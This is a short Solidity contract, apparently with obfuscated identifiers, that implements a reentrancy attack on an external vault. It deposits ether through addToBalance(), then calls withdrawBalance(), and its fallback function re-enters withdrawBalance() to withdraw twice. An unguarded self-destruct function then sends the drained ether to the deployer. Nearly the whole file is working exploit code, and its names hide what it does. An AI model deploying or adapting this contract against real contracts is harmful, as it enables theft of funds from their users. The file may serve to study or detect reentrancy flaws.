// SPDX-License-Identifier: MIT
pragma solidity ^0.4.15;

contract VaultOperator {
    bool public _0x65fb58=false;
    address public _0x39c289;
    address public _0x28780a;

    function VaultOperator() public{
        _0x28780a = msg.sender;
    }

    function _0xc84bda(address _0x6cff65) public payable{
        _0x39c289 = _0x6cff65 ;
        // call addToBalance with msg.value ethers
        require(_0x39c289.call.value(msg.value)(bytes4(_0x8553c4("addToBalance()"))));
    }

    function _0xa80653() public{
        _0x65fb58 = true;
        // call withdrawBalance

        require(_0x39c289.call(bytes4(_0x8553c4("withdrawBalance()"))));
    }

    function () public payable{

        if (_0x65fb58){
            _0x65fb58 = false;
                require(_0x39c289.call(bytes4(_0x8553c4("withdrawBalance()"))));
        }
    }

    function _0x14e8c5(){
        suicide(_0x28780a);
    }

}